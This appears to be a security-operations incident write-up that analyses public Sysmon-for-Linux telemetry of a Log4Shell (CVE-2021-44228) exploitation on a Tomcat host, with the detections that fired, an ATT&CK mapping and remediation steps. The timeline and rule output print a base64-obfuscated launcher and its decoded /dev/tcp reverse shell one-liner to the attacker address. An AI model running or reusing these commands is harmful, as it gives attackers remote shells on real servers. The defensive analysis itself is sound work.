# Incident 3: Log4Shell exploitation and reverse shell

**Dataset:** OTRF Security-Datasets,
`datasets/compound/Log4Shell/syslog_sysmon_log4shell_cve2021_44228_jndi_reference`
(MIT licence). This is Sysmon for Linux telemetry wrapped in the Azure Monitor
syslog JSON format; `soclab` reads the inner event XML.
**Host:** UBUNTU5 (Linux, Tomcat server).
**Analysed with:** `soclab run --rules detections <dataset> --format sysmon-xml`
over 93 events.

## Summary

A Java web application on UBUNTU5 was exploited through Log4Shell
(CVE-2021-44228). The exploited JVM ran a shell, which decoded a base64 payload
and connected back to the attacker at 192.168.2.6:443, giving an interactive
reverse shell that then ran basic discovery. The engine raised two rules: a
shell spawned by Java (the exploitation signal) and an outbound connection made
by a shell (the callback).

## Timeline

| Time (UTC) | Event | Detail |
|---|---|---|
| 18:10:21.998 | **Shell from Java** | `java` (`/usr/lib/jvm/java-8-openjdk-amd64/.../java`) -> `bash -c {echo,<base64>}|{base64,-d}|{bash,-i}` |
| 18:10:22.139 | **Reverse-shell callback** | `bash` makes an outbound connection to 192.168.2.6:443 |
| 18:10:25.513 | Shell network event | a second `bash` network connection |
| 18:10:22-33 | Discovery | `whoami`, `groups`, package queries run from the shell (seen in telemetry) |

The base64 in the first command decodes to:

```
bash -i >& /dev/tcp/192.168.2.6/443 0>&1
```

a classic `/dev/tcp` reverse shell. The parent being the Tomcat JVM, and the
callback happening 150 ms later, ties the two detections into one chain:
exploit -> shell -> callback.

## Rules that fired

```
[high]   Shell spawned by a Java process
    ParentImage=/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java
    Image=/bin/bash
    CommandLine=bash -c {echo,YmFzaC...}|{base64,-d}|{bash,-i}
    (Linux-Sysmon event 1, 18:10:21.998)

[medium] Outbound network connection made by a shell
    Image=bash      DestinationIp=192.168.2.6  DestinationPort=443
    Image=/bin/bash DestinationIp=0:0:0:0:0:0:0:0
    (Linux-Sysmon event 3, 18:10:22 and 18:10:25)
```

## ATT&CK mapping

| Tactic | Technique | Evidence |
|---|---|---|
| Initial Access | T1190 Exploit Public-Facing Application | shell spawned by the Tomcat JVM |
| Execution | T1059.004 Command and Scripting Interpreter: Unix Shell | `bash -i` reverse shell |
| Command and Control | (callback) | bash connection to 192.168.2.6:443 |
| Defense Evasion | T1140 Deobfuscate/Decode Files or Information | base64-encoded one-liner |

## Scope

- One host, UBUNTU5, running Tomcat. The attacker reached a shell as the
  account the web app runs under (the dataset shows the shell process owned by
  the Tomcat user). That account's permissions bound the immediate blast
  radius; any secrets that user can read (app config, database credentials,
  SSH keys) should be treated as exposed.
- The attacker IP 192.168.2.6 is the C2 to block and pivot the hunt around.

## Containment, eradication, recovery

1. **Contain:** block egress to 192.168.2.6, kill the `bash -i` process tree,
   and take UBUNTU5 off the network.
2. **Eradicate:** patch or remove the vulnerable Log4j (upgrade to a fixed
   version, or set `log4j2.formatMsgNoLookups` / remove the `JndiLookup`
   class as an interim). Rebuild the host if the reverse shell had time to do
   more than this dataset captured.
3. **Recover:** rotate every credential readable by the Tomcat user and any the
   app used (database, API keys). Restore the app from a known-good artifact.
   Put the server behind a WAF rule for JNDI lookup strings and make sure
   outbound connections from it are restricted by default.

## Tuning notes

- "Shell spawned by a Java process" will also fire when an application
  legitimately shells out. On this Tomcat host that should be rare, so it is a
  high-value rule, but on an app server that runs helper scripts it needs a
  baseline of the normal `java -> sh` command lines to exclude.
- The second network event shows `DestinationIp=0:0:0:0:0:0:0:0`, an
  artifact of how the listen/teardown side was recorded. The rule still fired
  correctly on the real callback; this is a reminder that Linux Sysmon network
  events include local/zero addresses that an analyst should read past.
- Two of the discovery commands (`whoami`, `groups`) were visible in the
  telemetry but not alerted on, which is the right call on their own; they add
  context once the two high-signal rules have fired.
